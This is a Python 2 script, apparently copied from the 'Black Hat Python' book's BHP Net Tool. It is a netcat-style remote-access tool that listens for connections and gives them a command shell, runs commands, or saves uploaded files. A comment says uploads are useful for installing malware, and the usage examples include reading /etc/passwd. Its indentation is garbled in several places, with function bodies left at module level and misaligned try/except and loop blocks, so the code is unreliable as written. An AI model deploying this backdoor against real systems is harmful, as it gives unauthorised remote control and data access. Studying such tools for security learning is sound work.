# Create a simple netcat replacement via Python
import sys
import socket
import getopt
import threading
import subprocess

# Script will read in all of the command-line options
# define some global variables
listen             = False
command            = False
upload             = False
execute            = ""
target             = ""
upload_destination = ""
port               = 0

def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen              - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run - execute the given file upon receiving a connection"
    print "-c --command             - initialize a command shell"
    print "-u --upload=destination  - upon receiving connection upload a file and write to [destination]"

    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options, set necessary variables depending on options detected
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
                                   ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
    # print useful usage info if command-line parameters don't match criteria
        print str(err)
        usage()


    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"

# Are we going to listen or just send data from stdin?
# Mimic netcat to read data from stdin and send it across the network
if not listen and len(target) and port > 0:

        # read in the buffer from the commandline
        # this will block, so send CTRL-D if not sending input to stdin
        buffer = sys.stdin.read()

        # send data off
        client_sender(buffer)

# we are going to listen and potentially upload things, execute commands,
# and drop a shell back depending on our command line options above
if listen:
    server_loop()    # detect that we are to set up a listening socket and process further commands

def client_sender(buffer):
# Setup TCP socket object
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect to our target host
        client.connect((target,port))
# test if we have received any input from stdin. If all is well, send data to remote remote target
        if len(buffer):
            client.send(buffer)

while True:
        # now wait for data back
        recv_len = 1
        response = ""
# receive data until there's no more data to receive
        while recv_len:

            data     = client.recv(4096)
            recv_len = len(data)
            response+= data

            if recv_len < 4096:
                break

        print response,

        # wait for more input, continue sending/receiving data until user kills script
        buffer = raw_input("")
        buffer += "\n"

        # send it off
        client.send(buffer)

except:

    print "[*] Exception! Exiting."

    # tear down the connection
    client.close()

# Create our primary server loop and a stub function that will handle both command execution and shell
def server_loop():
    global target

    # if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()



def run_command(command):

    # trim the newline
    command = command.rstrip()

    # run the command and get the output back
    try:
# subprocess provides powerful process-creation interface to start and interact with client programs
# in this case, we run whatever command we pass in, running it on local OS, and return output from command
# back to the client that is connected to us.
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n" # exception handling will catch generic errors and return error message

    # send the output back to the client
    return output

# Now lets implement the logic to do file uploads, command execution, and our shell
def client_handler(client_socket):
    global upload
    global execute
    global command
    # responsible for determining whether our network tool is set to receive a file when it receives a connection
    # useful for upload/execute or installing malware and having the malware remove our Python callback
    # check for upload
    if len(upload_destination):
        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available
        # receive the file data in  a loop
    while True:
        data = client_socket.recv(1024)

        if not data:
            break
        else:
            file_buffer += data    # put the data in a file buffer

    # now we take these bytes and try to write them out
    try:
# the wb flag ensures that we are writing the file with binary mode enabled,
# which ensures that uplodaing and writing a binary executable will be successful.
        file_descriptor = open(upload_destination,"wb")
        file_descriptor.write(file_buffer)
        file_descriptor.close()

        # acknowledge that we wrote the file out
        client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
    except:
        client_socket.send("Failed to save file to %s\r\n" % upload_destination)



# Check for command execution
if len(execute):
    # run the command
    output = run_command(execute)

    client_socket.send(output)


# now we go into another loop if a command shell was requested
# this code handles command shell -- it will continue to execute commands and send back output
if command:

    while True:
        # show a simple prompt
        client_socket.send("<BHP:#> ")

        # now we receive until we see a linefeed (enter key), just like netcat :)
        cmd_buffer = ""
        while "\n" not in cmd_buffer:
            cmd_buffer += client_socket.recv(1024)

        # send back the command output
        response = run_command(cmd_buffer)

        # send back the response
        client_socket.send(response)


main()

